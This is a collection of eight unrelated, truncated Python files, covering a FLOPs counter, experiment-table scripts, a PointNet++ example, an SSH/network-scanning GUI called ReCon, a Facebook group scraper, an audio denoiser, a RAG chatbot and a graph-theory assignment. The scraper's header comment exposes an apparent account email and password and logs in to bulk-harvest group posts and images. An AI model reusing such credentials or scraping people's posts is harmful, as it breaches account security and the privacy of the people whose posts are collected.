    "import torch.nn as nn\nimport torch\nimport numpy as np\n\n'''\n---- 1) FLOPs: floating point operations\n---- 2) #Activations: the number of elements of all \u2018Conv2d\u2019 outputs\n---- 3) #Conv2d: the number of \u2018Conv2d\u2019 layers\n'''\n\ndef get_model_flops(model, input_res, print_per_layer_stat=True,\n                              input_constructor=None):\n    assert type(input_res) is tuple, 'Please provide the size of the input image.'\n    assert len(input_res) >= 3, 'Input image should have 3 dimensions.'\n    flops_model = add_flops_counting_methods(model)\n    flops_model.eval().start_flops_count()\n    if input_constructor:\n        input = input_constructor(input_res)\n        _ = flops_model(**input)\n    else:\n        device = list(flops_model.parameters())[-1].device\n        batch = torch.FloatTensor(1, *input_res).to(device)\n        _ = flops_model(batch)\n\n    if print_per_layer_stat:\n        print_model_with_flops(flops_model)\n    flops_count = flops_model.compute_average_flops_cost()\n    flops_model.stop_flops_count()\n\n    return flops_count\n\ndef get_model_activation(model, input_res, input_constructor=None):\n    assert type(input_res) is tuple, 'Please provide the size of the input image.'\n    assert len(input_res) >= 3, 'Input image should have 3 dimensions.'\n    activation_model = add_activation_counting_methods(model)\n    activation_model.eval().start_activation_count()\n    if input_constructor:\n        input = input_constructor(input_res)\n        _ = activation_model(**input)\n    else:\n        device = list(activation_model.parameters())[-1].device\n        batch = torch.FloatTensor(1, *input_res).to(device)\n        _ = activation_model(batch)\n\n    activation_count, num_conv = activation_model.compute_average_activation_cost()\n    activation_model.stop_activation_count()\n\n    return activation_count, num_conv\n\n\ndef get_model_complexity_info(model, input_res, print_per_layer_stat=True, as_strings=True,\n                              input_constructor=None):\n    assert type(input_res) is tuple\n    assert len(input_res) >= 3\n    flops_model = add_flops_counting_methods(model)\n    flops_model.eval().start_flops_count()\n    if input_constructor:\n        input = input_constructor(input_res)\n        _ = flops_model(**input)\n    else:\n        batch = torch.FloatTensor(1, *input_res)\n        _ = flops_model(batch)\n\n    if print_per_layer_stat:\n        print_model_with_flops(flops_model)\n    flops_count = flops_model.compute_average_flops_cost()\n    params_count = get_model_parameters_number(flops_model)\n    flops_model.stop_flops_count()\n\n    if as_strings:\n        return flops_to_string(flops_count), params_to_string(params_count)\n\n    return flops_count, params_count\n\n\ndef flops_to_string(flops, units='GMac', precision=2):\n    if units is None:\n        if flops // 10**9 > 0:\n            return str(round(flops / 10.**9, precision)) + ' GMac'\n        elif flops // 10**6 > 0:\n            return str(round(flops / 10.**6, precision)) + ' MMac'\n        elif flops // 10**3 > 0:\n            return str(round(flops / 10.**3, precision)) + ' KMac'\n        else:\n            return str(flops) + ' Mac'\n    else:\n        if units == 'GMac':\n            return str(round(flops / 10.**9, precision)) + ' ' + units\n        elif units == 'MMac':\n            return str(round(flops / 10.**6, precision)) + ' ' + units\n        elif units == 'KMac':\n            return str(round(flops / 10.**3, precision)) + ' ' + units\n        else:\n            return str(flops) + ' Mac'\n\n\ndef params_to_string(params_num):\n    if params_num // 10 ** 6 > 0:\n        return str(round(params_num / 10 ** 6, 2)) + ' M'\n    elif params_num // 10 ** 3:\n        return str(round(params_num / 10 ** 3, 2)) + ' k'\n    else:\n        return str(params_num)\n\n\ndef print_model_with_flops(model, units='GMac', precision=3):\n    total_flops = model.compute_average_flops_cost()\n\n    def accumulate_flops(self):\n        if is_supported_instance(self):\n            return self.__flops__ / model.__batch_counter__\n        else:\n            sum = 0\n            for m in self.children():\n                sum += m.accumulate_flops()\n            return sum\n\n    def flops_repr(self):\n        accumulated_flops_cost = self.accumulate_flops()\n        return ', '.join([flops_to_string(accumulated_flops_cost, units=units, precision=precision),\n                          '{:.3%} MACs'.format(accumulated_flops_cost / total_flops),\n                          self.original_extra_repr()])\n\n    def add_extra_repr(m):\n        m.accumulate_flops = accumulate_flops.__get__(m)\n        flops_extra_repr = flops_repr.__get__(m)\n        if m.extra_repr != flops_extra_repr:\n            m.original_extra_repr = m.extra_repr\n            m.extra_repr = flops_extra_repr\n            assert m.extra_repr != m.original_extra_repr\n\n    def del_extra_repr(m):\n        if hasattr(m, 'original_extra_repr'):\n            m.extra_repr = m.original_extra_repr\n            del m.original_extra_repr\n        if hasattr(m, 'accumulate_flops')",
    "#!/usr/bin/python3\n# Author: Suzanna Sia\n\nfrom code.utils import io_utils\nfrom omegaconf import OmegaConf\nimport os\nimport itertools\nimport json\nimport argparse\nimport pandas as pd\nimport numpy as np\nimport pathlib\n\nmkpath = lambda x: pathlib.Path(os.path.dirname(x)).mkdir(parents=True, exist_ok=True) \n\nrd = lambda x: np.around(x, 1)\n\n# Exp settings that we are looping over\nsettings = {\"NPROMPTS\": [0],\n            \"CONTRASTS\":['x', 'u', 'ux'],\n            \"SAMPLING\": ['default', \"beamsearch\"],\n            \"ALPHAS\": [0.1, 0.3],\n            \"MODELS\":  ['xglm2.9B', 'xglm7.5B', 'bloom3b', 'bloom7b1', 'llama7b', 'llama7b-chat'],\n            \"METRICS\": ['bleu']}\n\n# Other Possible flags: \n# python code/present/logits/main_tables.py --data.direction en-es\n# python code/present/logits/main_tables.py --format_cf configs/format_instr_L2.yaml\n\ndef keep_row_condition(results):\n    # keep condition\n    condition1 = (results['alpha']==0.1) & (results['mode']=='pmi')\n    condition2 = (results['alpha']==0.3) & (results['mode']==\"anti_lm\") \n    results = results[condition1 | condition2]\n    return results\n\ndef get_default_argparser():\n    # expose this function\n    argparser = argparse.ArgumentParser()\n    argparser.add_argument('--seed', default=0, type=int)\n    argparser.add_argument('--format_cf', default='configs/format/instr_L1L2.yaml') \n    argparser.add_argument('--prompt_select_cf',\n                            default='configs/prompt_select/random.yaml')\n    argparser.add_argument('--data_cf', default='configs/data/default.yaml')\n    argparser.add_argument('--generator_cf', default='configs/generator/default.yaml')\n    argparser.add_argument('--logitsp_cf', default='configs/logits_processor/default.yaml')\n    argparser.add_argument('--model_cf', default='configs/model/default.yaml')\n    argparser.add_argument('--file_paths_cfg', default=\"configs/file_paths/logits.yaml\")\n\n    return argparser\n\ndef main():\n    results = []\n    #this corresponds to configs/logits_processor/{mode}.yaml\n    MODES = [\"default\", \"anti_lm\", \"pmi\", \"anti_lm_jsd\", \"anti_lm_relu\"]\n\n    for mode in MODES:\n        argparser = get_default_argparser()\n        args, uk_args = argparser.parse_known_args()\n        args.logitsp_cf = f\"configs/logits_processor/{mode}.yaml\"\n\n        args = io_utils.merge_omegaconf_w_argparse(args, uk_args, verbose=False)\n\n        cfp = OmegaConf.load(args.file_paths_cfg)\n\n        combinations = list(itertools.product(*settings.values()))\n        keys = list(settings.keys())\n\n        # this is equivalennt to big nested for loop\n        for exp_variables in combinations:\n            # very brittle to ordering\n            nprompt, contrast, sampling_type, alpha, model, metric = exp_variables\n\n            args.sample_prompts.nprompts = nprompt\n            args.logitsp.contrast_logits_type = contrast\n            args.generator.name = sampling_type\n            args.logitsp.alpha = alpha\n            args.model.model_size = model\n\n            gen_fn = cfp['gen_fn'].format(**args)\n            res_fn = cfp['res_fn'].format(**args)\n            res = {}\n            res['mode'] = mode\n\n            if os.path.exists(res_fn): # and os.path.exists(gen_fn):\n                if metric == \"bleu\":\n                    with open(res_fn, 'r') as f:\n                        data = json.load(f)\n                    res[metric] = rd(data[0][metric])\n\n                elif metric == \"empty\":\n                    \n                    data = pd.read_csv(gen_fn, sep=\"\\t\")\n                    data['gen_text'].fillna(\"\", inplace=True)\n                    data['gen_text'] = data['gen_text'].apply(lambda x: x.replace(\"<|endoftext|>\", \"\").strip())\n                    data['gen_text'] = data['gen_text'].apply(lambda x: x.replace(\"<\", \"\").strip())\n                    empty_gen_str = len(data[data['gen_text']==\"\"])\n                    res[metric] = np.around (100 * (empty_gen_str ) / len(data), 1)\n                    \n            else:\n                continue\n\n            if mode == \"default\":\n                res['contrast'] = \"NA\"\n                res['alpha'] = 0\n                res['name'] = \"default\"\n\n            else:\n                res['contrast'] = contrast\n                res['alpha'] = alpha\n                res['name'] = f\"{mode}_{contrast}\"\n\n            res['sampling'] = sampling_type\n            res['nprompt'] = nprompt\n            res['model'] = model\n            res['fn'] = res_fn\n            results.append(res)\n\n    results = pd.DataFrame(results)\n    results = results.drop_duplicates()\n    results = keep_row_condition(results)\n\n    # Printing Latex Table\n    SAMPLING = settings['SAMPLING']\n    EXPS = ['default', 'pmi_u', 'pmi_x', 'anti_lm_u', 'anti_lm_x']\n    table_columns = list(itertools.product(SAMPLING, EXPS))\n\n    gb_df = pd.pivot_table(results, index='model', columns=['sampling', 'name'], values=metric)\n    gb_df = gb_df.reindex(settings['MODELS']) #, level=0)\n    for col in table_columns:\n        if col not in gb_df:\n            gb_df[col] ",
    "import os.path as osp\n\nimport torch\nimport torch.nn.functional as F\n\nimport torch_geometric.transforms as T\nfrom torch_geometric.datasets import ModelNet\nfrom torch_geometric.loader import DataLoader\nfrom torch_geometric.nn import MLP, PointNetConv, fps, global_max_pool, radius\nfrom torch_geometric.typing import WITH_TORCH_CLUSTER\n\nif not WITH_TORCH_CLUSTER:\n    quit(\"This example requires 'torch-cluster'\")\n\n\nclass SAModule(torch.nn.Module):\n    def __init__(self, ratio, r, nn):\n        super().__init__()\n        self.ratio = ratio\n        self.r = r\n        self.conv = PointNetConv(nn, add_self_loops=False)\n\n    def forward(self, x, pos, batch):\n        idx = fps(pos, batch, ratio=self.ratio)\n        row, col = radius(pos, pos[idx], self.r, batch, batch[idx],\n                          max_num_neighbors=64)\n        edge_index = torch.stack([col, row], dim=0)\n        x_dst = None if x is None else x[idx]\n        x = self.conv((x, x_dst), (pos, pos[idx]), edge_index)\n        pos, batch = pos[idx], batch[idx]\n        return x, pos, batch\n\n\nclass GlobalSAModule(torch.nn.Module):\n    def __init__(self, nn):\n        super().__init__()\n        self.nn = nn\n\n    def forward(self, x, pos, batch):\n        x = self.nn(torch.cat([x, pos], dim=1))\n        x = global_max_pool(x, batch)\n        pos = pos.new_zeros((x.size(0), 3))\n        batch = torch.arange(x.size(0), device=batch.device)\n        return x, pos, batch\n\n\nclass Net(torch.nn.Module):\n    def __init__(self):\n        super().__init__()\n\n        # Input channels account for both `pos` and node features.\n        self.sa1_module = SAModule(0.5, 0.2, MLP([3, 64, 64, 128]))\n        self.sa2_module = SAModule(0.25, 0.4, MLP([128 + 3, 128, 128, 256]))\n        self.sa3_module = GlobalSAModule(MLP([256 + 3, 256, 512, 1024]))\n\n        self.mlp = MLP([1024, 512, 256, 10], dropout=0.5, norm=None)\n\n    def forward(self, data):\n        sa0_out = (data.x, data.pos, data.batch)\n        sa1_out = self.sa1_module(*sa0_out)\n        sa2_out = self.sa2_module(*sa1_out)\n        sa3_out = self.sa3_module(*sa2_out)\n        x, pos, batch = sa3_out\n\n        return self.mlp(x).log_softmax(dim=-1)\n\n\ndef train(epoch):\n    model.train()\n\n    for data in train_loader:\n        data = data.to(device)\n        optimizer.zero_grad()\n        loss = F.nll_loss(model(data), data.y)\n        loss.backward()\n        optimizer.step()\n\n\ndef test(loader):\n    model.eval()\n\n    correct = 0\n    for data in loader:\n        data = data.to(device)\n        with torch.no_grad():\n            pred = model(data).max(1)[1]\n        correct += pred.eq(data.y).sum().item()\n    return correct / len(loader.dataset)\n\n\nif __name__ == '__main__':\n    path = osp.join(osp.dirname(osp.realpath(__file__)), '..',\n                    'data/ModelNet10')\n    pre_transform, transform = T.NormalizeScale(), T.SamplePoints(1024)\n    train_dataset = ModelNet(path, '10', True, transform, pre_transform)\n    test_dataset = ModelNet(path, '10', False, transform, pre_transform)\n    train_loader = DataLoader(train_dataset, batch_size=32, shuffle=True,\n                              num_workers=6)\n    test_loader = DataLoader(test_dataset, batch_size=32, shuffle=False,\n                             num_workers=6)\n\n    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n    model = Net().to(device)\n    optimizer = torch.optim.Adam(model.parameters(), lr=0.001)\n\n    for epoch in range(1, 201):\n        train(epoch)\n        test_acc = test(test_loader)\n        print(f'Epoch: {epoch:03d}, Test: {test_acc:.4f}')\n",
    "from threading import Thread\nfrom ui import RcUI\nfrom model import ReCon\nfrom CTkMessagebox import CTkMessagebox\nimport webbrowser\nimport os\n\n\nclass App:\n    def __init__(self):\n        # read config\n        self.logic = None\n        self.ui = None\n        self.init_logic()\n        self.init_ui()\n\n    def init_logic(self):\n        # init model\n        self.logic = ReCon()\n        self.logic.bind(\"activity\", self.on_model_activity)\n        self.logic.bind(\"initialized\", self.on_model_initialize)\n        self.logic.bind(\"host_establishment\", self.on_model_host_establishment)\n        self.logic.bind(\"consoles_loaded\", self.on_model_consoles_loaded)\n        self.logic.bind(\"local_networks_loaded\", self.on_model_local_networks_loaded)\n        self.logic.bind(\"node_found\", self.on_model_node_found)\n        self.logic.bind(\"nodes_loaded\", self.on_model_nodes_loaded)\n        self.logic.bind(\"tunnel_established\", self.on_model_tunnel_established)\n        self.logic.bind(\"tunnel_closed\", self.on_model_tunnel_closed)\n\n    def init_ui(self):\n        # init ui\n        self.ui = RcUI(title=\"ReCon\")\n        self.ui.frames[\"login\"].cmbx_sshosts.configure(command=self.on_ui_cmbx_sshosts_change)\n        self.ui.frames[\"login\"].txt_password.bind(\"<KeyRelease>\", self.on_ui_txt_password_keyrelease)\n        self.ui.frames[\"login\"].btn_connect.configure(command=self.on_ui_btn_connect_click)\n        self.ui.frames[\"devices\"].btn_spawn_shell.configure(command=self.on_ui_btn_spawn_shell)\n        self.ui.frames[\"devices\"].btn_consoles_refresh.configure(command=self.on_ui_btn_consoles_refresh)\n        self.ui.frames[\"devices\"].btn_spawn_console.configure(command=self.on_ui_btn_spawn_console)\n        self.ui.frames[\"devices\"].btn_nics_refresh.configure(command=self.on_ui_btn_nics_refresh)\n        self.ui.frames[\"devices\"].btn_nodes_refresh.configure(command=self.on_ui_btn_nodes_refresh)\n        self.ui.frames[\"devices\"].btn_tunnel_https.configure(command=self.on_ui_btn_node_tunnel_https)\n\n    def start(self):\n        self.logic.start()\n        self.ui.start()  # doesn't return while UI running\n\n    # Event handlers\n    # app\n    def on_stop(self):\n        self.logic.stop()\n\n    # model\n    def on_model_initialize(self):\n        if len(self.logic.host_pool):\n            values = tuple(h for h in self.logic.host_pool)\n            self.ui.frames[\"login\"].cmbx_sshosts.configure(values=values)\n        if self.logic.current_host:\n            self.ui.frames[\"login\"].txt_username.insert(0, self.logic.current_host.username)\n            self.ui.frames[\"login\"].cmbx_sshosts.set(self.logic.current_host.address)\n        else:\n            self.ui.frames[\"login\"].txt_username.insert(0, os.getlogin())\n        self.ui.set_status(\"Ready!\")\n        self.ui.show(\"login\")\n\n    def on_model_activity(self, msg):\n        self.ui.set_status(msg)\n\n    def on_model_host_establishment(self, is_ok, error=None):\n        if is_ok:\n            self.ui.set_connection_info_at_title(self.logic.current_host.username, self.logic.current_host.address)\n            self.ui.set_status(\"Connection established!\")\n            self.ui.show(\"devices\")\n        else:\n            self.ui.set_status(f\"Can't connect! ({error})\", True)\n            self.ui.frames[\"login\"].set_accessibility(\"normal\")\n\n\n    def on_model_consoles_loaded(self, consoles):\n        self.ui.set_status(\"Consoles loaded.\")\n        self.ui.frames[\"devices\"].cmbx_consoles.configure(values=consoles)\n        self.ui.frames[\"devices\"].cmbx_consoles.set(consoles[0])\n        self.ui.frames[\"devices\"].btn_spawn_console.configure(state=\"normal\")\n        self.ui.frames[\"devices\"].btn_consoles_refresh.configure(state=\"normal\")\n\n    def on_model_local_networks_loaded(self, networks):\n        self.ui.set_status(\"Local networks loaded.\")\n        self.ui.frames[\"devices\"].cmbx_nics.configure(values=networks)\n        self.ui.frames[\"devices\"].cmbx_nics.set(networks[0])\n        self.ui.frames[\"devices\"].btn_nics_refresh.configure(state=\"normal\")\n        if not self.logic.current_host.nodes:\n            msg = CTkMessagebox(title=\"Proceed?\",\n                                message=\"No previously found nodes available. Selected network will be scanned.\"\n                                        \"Do you want to proceed?\",\n                                icon=\"question\", option_1=\"No\", option_2=\"Yes\")\n            if msg.get() == \"Yes\":\n                Thread(target=self.logic.enumerate_nodes).start()\n\n    def on_model_node_found(self, node):\n        self.ui.frames[\"devices\"].add_lbx_node(node)\n\n    def on_model_nodes_loaded(self):\n        self.ui.set_status(f\"Nodes loaded.\")\n        self.ui.frames[\"devices\"].btn_nodes_refresh.configure(state=\"normal\")\n        self.ui.frames[\"devices\"].btn_tunnel_https.configure(state=\"normal\")\n\n    def on_model_tunnel_established(self, port_mapping):\n        self.ui.frames[\"devices\"].extend_lbx_nodes(port_mapping, handler=self.on_ui_lbx_node_double_click)\n        self.ui.frames[\"devices\"].btn_tunnel_http",
    "#python3 scraper.py mee589731@gmail.com mee12345@ https://www.facebook.com/groups/1436956330229869 --group\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nimport time\nfrom selenium.webdriver.common.by import By\nfrom bs4 import BeautifulSoup\nimport os\nimport requests\nimport uuid\nimport re\nimport csv\nfrom argparse import ArgumentParser\nparser = ArgumentParser()\ndef is_valid_url(url):\n    # Regular expression to validate URLs\n    url_regex = r\"^(http|https)://[^\\s/$.?#].[^\\s]*$\"\n    return re.match(url_regex, url) is not None\n\nif __name__ == \"__main__\":\n    parser.add_argument(\"--username\", type=str, help=\"Username for authentication\")\n    parser.add_argument(\"--password\", type=str, help=\"Password for authentication\")\n    parser.add_argument(\"--link\", type=str, help=\"Link to the group, page, or profile\")\n\n    parser.add_argument(\"--group\", action=\"store_true\", help=\"Scrape as a group\")\n    parser.add_argument(\"--page\", action=\"store_true\", help=\"Scrape as a page\")\n    parser.add_argument(\"--profile\", action=\"store_true\", help=\"Scrape as a profile\")\n    args = parser.parse_args()\n\n    if not any([args.group, args.page, args.profile]):\n        parser.error(\"Please specify --group, --page, or --profile\")\n\n    if args.group and (args.page or args.profile):\n        parser.error(\"Cannot specify both --group and --page/--profile\")\n\n    if not is_valid_url(args.link):\n        parser.error(\"Invalid link format. Please provide a valid URL.\")\n\n    # Your scraping logic goes here\n    print(\"Username:\", args.username)\n    print(\"Password:\", args.password)\n    print(\"Link:\", args.link)\n    print(\"Group:\", args.group)\n    print(\"Page:\", args.page)\n    print(\"Profile:\", args.profile)\n\n\nchrome_options = Options()\n\nchrome_options.add_argument(\"--incognito\")\nchrome_options.add_argument(\"--window-size=1920 x 1080\")\n\ndriver = webdriver.Chrome(chrome_options=chrome_options, executable_path='/bin/chromedriver')\n\ndriver.get('https://www.facebook.com/login/')\ntime.sleep(1)\n\nGroup = True\n\ndir = './scraped_data/'\nif not os.path.exists(dir):\n    os.makedirs(dir)\n    \nuser = driver.find_element_by_xpath('//*[@id=\"email\"]').send_keys(args.username)\npassword = driver.find_element_by_xpath('//*[@id=\"pass\"]').send_keys(args.password)\nsubmit = driver.find_element_by_xpath('//*[@id=\"loginbutton\"]').click()\ntime.sleep(1)\n\n# driver.get('https://www.facebook.com/MyanmarCelebrityTV')#page\ndriver.get(args.link)#group\n# driver.get('https://www.facebook.com/thetnaingoo123514')#profile\ntime.sleep(1)\n\n#clicking group feed order\nsorting_svg = driver.find_element(By.CSS_SELECTOR, '.x19dipnz.x1lliihq.x1k90msu.x2h7rmj.x1qfuztq[title=\"sort group feed by\"]')\ndriver.execute_script(\"arguments[0].setAttribute('title', 'New posts')\", sorting_svg)\nsorting_svg.click()\n\n#wait and click New posts\ntime.sleep(1)\n# Find the element for \"New posts\" by its class name\nnew_posts_element = driver.find_element(By.XPATH, \"//span[@class='x193iq5w xeuugli x13faqbe x1vvkbs x10flsy6 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x41vudc x6prxxf xvq8zen xk50ysn xzsf02u x1yc453h' and contains(text(), 'New posts')]\")\n\n# Click the \"New posts\" element\nnew_posts_element.click()\n\n#real time updating and scraping\ndownloaded_images = set()\ndata = []\ntotal_images_saved = 0\ntotal_text_saved = 0\n\ndef extract_new_posts():\n    global downloaded_images\n    global data\n    global total_images_saved\n    global total_text_saved\n    for i in range (1):\n        # Scroll to load more posts\n        driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);\")\n        time.sleep(1)\n        \n        # Find all posts\n        posts = driver.find_elements(By.CSS_SELECTOR, \".x78zum5.xdt5ytf.xz62fqu.x16ldp7u\")\n\n        # Loop through the posts and extract data\n        for post in posts:\n            # Text extraction\n            post_html = post.get_attribute('outerHTML')\n            soup = BeautifulSoup(post_html, 'html.parser')\n            div_elements = soup.find_all('div')\n\n            # Extract text containing 'Mee'\n            extracted_text = [div.get_text() for div in div_elements if 'Mee' in div.get_text()]\n            for text in extracted_text:\n                if text not in data:\n                    data.append(text)\n                    total_text_saved += 1\n                    print(\"Text added\")\n\n            # Image extraction\n            image_elements = driver.find_elements(By.CSS_SELECTOR, \"img.x1ey2m1c.xds687c.x5yr21d.x10l6tqk.x17qophe.x13vifvy.xh8yej3.xl1xv1r\")\n\n            # Loop through each image element\n            for image_element in image_elements:\n                image_src = image_element.get_attribute(\"src\")\n                if image_src in downloaded_images:\n                    continue\n                response = requests.get(image_src)\n                if response.status_code == 200:\n                    image_id = uuid.uuid4().hex[:8]  # Generate a random 8-character hex string\n                    file_name = f\"i",
    "import streamlit as st\nimport numpy as np\nimport io\nimport pydub\nfrom df.enhance import enhance, init_df, save_audio\nimport soundfile as sf\nimport torchaudio\nimport matplotlib.pyplot as plt\nimport librosa\nimport torch\n\nst.title(\"Probably(?) a better Adobe Enhance Speech\")\nst.subheader(\"Made possible thanks to DeepFilterNet\")\n\nuploaded_file = st.file_uploader(\"Upload your audio file here\")\nif uploaded_file is not None:\n    audio_array, sample_rate = librosa.load(uploaded_file, sr=None) \n    audio_stream = io.BytesIO(uploaded_file.getvalue())\n    audio = pydub.AudioSegment.from_file(audio_stream)\n    temp_audio_file = io.BytesIO()\n    audio.export(temp_audio_file, format=\"wav\")\n    raw_audio = temp_audio_file.getvalue()\n    st.audio(raw_audio, format='audio/wav')\n    \n    # print(waveform)\n    if st.button('Clean Audio'):\n        audio_stream = io.BytesIO(raw_audio) \n        model, df_state, _ = init_df()\n        waveform, sample_rate = torchaudio.load(audio_stream)\n        enhanced = enhance(model, df_state, waveform)\n        enhanced_numpy = enhanced.cpu().numpy()\n        st.write('Cleaned audio')\n        st.audio(enhanced_numpy, format='audio/wav', sample_rate=sample_rate)\n\n        # Plot spectrograms\n        fig, axs = plt.subplots(1, 2, figsize=(12, 6))\n\n        # Original audio spectrogram\n        orig_spec = librosa.feature.melspectrogram(y=audio_array, sr=sample_rate)\n        librosa.display.specshow(librosa.power_to_db(orig_spec, ref=np.max), sr=sample_rate, x_axis='time', y_axis='mel', ax=axs[0])\n        axs[0].set(title='Original Audio Spectrogram')\n\n        # Enhanced audio spectrogram\n        enhanced_spec = librosa.feature.melspectrogram(y=enhanced_numpy.squeeze(), sr=sample_rate)\n        librosa.display.specshow(librosa.power_to_db(enhanced_spec, ref=np.max), sr=sample_rate, x_axis='time', y_axis='mel', ax=axs[1])\n        axs[1].set(title='Cleaned Audio Spectrogram')\n\n        st.pyplot(fig)\n\n        st.write(f\"DeepFilterNet's GitHub repo: <a href='https://github.com/Rikorose/DeepFilterNet'>https://github.com/Rikorose/DeepFilterNet</a>\", unsafe_allow_html=True)\n        # st.audio(uploaded_file.getvalue(), format='audio/wav')\n\n\n# debugging archive\n# audio_path = download_file(\n#         \"https://github.com/Rikorose/DeepFilterNet/raw/e031053/assets/noisy_snr0.wav\",\n#         download_dir=\".\",\n#     )\n# st.audio(audio_path, format='audio/wav')\n\n# model, df_state, _ = init_df()\n# audio, _ = load_audio(audio_path, sr=df_state.sr())\n# waveform, sample_rate = torchaudio.load('noisy_snr0.wav')\n\n# print(audio)\n# st.write(audio)\n# print(waveform)\n# st.write(waveform)\n\n# # Denoise the audio\n# enhanced = enhance(model, df_state, audio)\n# # Save for listening\n# # save_audio(\"enhanced.wav\", enhanced2, df_state.sr())\n# enhanced_numpy = enhanced.cpu().numpy()\n# sample_rate = df_state.sr()\n# st.audio(enhanced_numpy, format='audio/wav', sample_rate=sample_rate)\n",
    "import streamlit as st\nfrom langchain_core.messages import AIMessage, HumanMessage\nfrom langchain_community.document_loaders import WebBaseLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_community.vectorstores import Chroma\nfrom langchain_openai import OpenAIEmbeddings, ChatOpenAI\nfrom dotenv import load_dotenv\nfrom langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder\nfrom langchain.chains import create_history_aware_retriever, create_retrieval_chain\nfrom langchain.chains.combine_documents import create_stuff_documents_chain\nimport time\nfrom collections import deque\n__import__('pysqlite3')\nimport sys\nsys.modules['sqlite3'] = sys.modules.pop('pysqlite3')\nload_dotenv()\n\n\nRATE_LIMIT = 100  # requests per minute\nTIME_WINDOW = 60  # seconds\n\n\nrequest_times = deque()\n\n\ndef get_vectorstore_from_url(url):\n    # get the text in document form\n    loader = WebBaseLoader(url)\n    document = loader.load()\n\n    # split the document into chunks\n    text_splitter = RecursiveCharacterTextSplitter()\n    document_chunks = text_splitter.split_documents(document)\n\n    # create a vectorstore from the chunks\n    vector_store = Chroma.from_documents(document_chunks, OpenAIEmbeddings())\n\n    return vector_store\n\n\ndef check_rate_limit():\n    current_time = time.time()\n    while request_times and current_time - request_times[0] > TIME_WINDOW:\n        request_times.popleft()\n    if len(request_times) < RATE_LIMIT:\n        request_times.append(current_time)\n        return True\n    return False\n\n\ndef get_context_retriever_chain(vector_store):\n    llm = ChatOpenAI()\n\n    retriever = vector_store.as_retriever()\n\n    prompt = ChatPromptTemplate.from_messages([\n        MessagesPlaceholder(variable_name=\"chat_history\"),\n        (\"user\", \"{input}\"),\n        (\"user\",\n         \"Given the above conversation, generate a search query to look up in order to get information relevant to the conversation\")\n    ])\n\n    retriever_chain = create_history_aware_retriever(llm, retriever, prompt)\n\n    return retriever_chain\n\n\ndef get_conversational_rag_chain(retriever_chain):\n    llm = ChatOpenAI()\n\n    prompt = ChatPromptTemplate.from_messages([\n        (\"system\", \"Answer the user's questions based on the below context:\\n\\n{context}\"),\n        MessagesPlaceholder(variable_name=\"chat_history\"),\n        (\"user\", \"{input}\"),\n    ])\n\n    stuff_documents_chain = create_stuff_documents_chain(llm, prompt)\n\n    return create_retrieval_chain(retriever_chain, stuff_documents_chain)\n\n\ndef get_response(user_input):\n    retriever_chain = get_context_retriever_chain(st.session_state.vector_store)\n    conversation_rag_chain = get_conversational_rag_chain(retriever_chain)\n\n    response = conversation_rag_chain.invoke({\n        \"chat_history\": st.session_state.chat_history,\n        \"input\": user_input\n    })\n\n    return response['answer']\n\n\n# app config\nst.set_page_config(page_title=\"Chat with websites\", page_icon=\"\ud83e\udd16\")\nst.title(\"Chat with websites\")\n\n# sidebar\nwith st.sidebar:\n    st.header(\"Settings\")\n    website_url = st.text_input(\"Website URL\")\n\nif website_url is None or website_url == \"\":\n    st.info(\"Please enter a website URL\")\n\nelse:\n    # session state\n    if \"chat_history\" not in st.session_state:\n        st.session_state.chat_history = [\n            AIMessage(content=\"Hello, I am a bot. How can I help you?\"),\n        ]\n    if \"vector_store\" not in st.session_state:\n        st.session_state.vector_store = get_vectorstore_from_url(website_url)\n\n        # user input\n    user_query = st.chat_input(\"Type your message here...\")\n    if user_query is not None and user_query != \"\":\n        if check_rate_limit():\n            response = get_response(user_query)\n            st.session_state.chat_history.append(HumanMessage(content=user_query))\n            st.session_state.chat_history.append(AIMessage(content=response))\n        else:\n            st.error(\"Rate limit exceeded. Please try again later.\")\n\n    # conversation\n    for message in st.session_state.chat_history:\n        if isinstance(message, AIMessage):\n            with st.chat_message(\"AI\"):\n                st.write(message.content)\n        elif isinstance(message, HumanMessage):\n            with st.chat_message(\"Human\"):\n                st.write(message.content)\n",
    "from typing import Dict, List\n# main.py\n# -*- coding: utf-8 -*-\n# ---------------------------------------------------------------------------\n# Created By  : Audrey DAMIBA, Melissa LACHEB, Tim\u00e9o GOGOLACHVILI , Thomas MASSELLES, Zo\u00e9 LE MAIGUET\n# Creation Date: 2024-03-29\n# ---------------------------------------------------------------------------\n\n\"\"\" This program will perform this perform on graphs representing constraint tables\n    Operations availables are:\n\n        -Read a constraint table\n        -Display a graph from the constraint table as matrix\n        -build a graph from the constraint table\n        -compute the earliest date calendar\n        -compute the latest date calendar\n        -compute the floats\n        -compute the critical path\n\n        \n    This project is a part of the course SM601I - Graph Theory (L3-INT - 2324S6)\n        \n        \"\"\"\n\ndef read_constraint_table(file_name):\n\n    '''read_constraint_table function takes as a parameter a .txt file and returns a graph representing the constraint table'''\n    graph = {}\n    with open(file_name, 'r') as file:\n        for line in file:\n            if line.strip():\n                parts = line.split()\n                vertex_number = parts[0]\n                duration = parts[1]\n                predecessors = [int(p) for p in parts[2:]]\n                graph[int(vertex_number)] = {'duration': int(duration), 'predecessors': predecessors}\n\n    return graph\n\ndef get_successors(graph):\n\n    '''get_successors function takes as a parameter a graph and returns a dictionary of successors for each vertex'''\n\n    successors = {vertex: [] for vertex in graph}\n\n    for vertex, data in graph.items():\n        predecessors = data['predecessors']\n        for predecessor in predecessors:\n            successors[predecessor].append(vertex)\n\n    return successors\n\ndef has_negative_edges(graph):\n    \n        '''has_negative_edges function takes as a parameter a graph and returns True if the graph contains negative edges, False otherwise'''\n    \n        for vertex, data in graph.items():\n            for predecessor in data['predecessors']:\n                if graph[predecessor]['duration'] < 0:\n                    print(\"The graph contains negative edges.\")\n                    return True\n\n        print(\"The graph does not contain negative edges.\")\n        return False\n\ndef display_graph_edges(graph):\n\n    '''display_graph_edges function takes as a parameter a graph and displays the edges of the graph'''\n\n    for node, data in graph.items():\n        for predecessor in data['predecessors']:\n            duration = graph[predecessor]['duration']\n            print(f\"{predecessor} -> {node} = {duration}\")\n\ndef add_fictitious_vertices(graph):\n    '''add_fictitious_vertices function takes as a parameter a graph and adds two fictitious vertices: one at the beginning and one at the end of the graph'''\n    # Add the fictitious 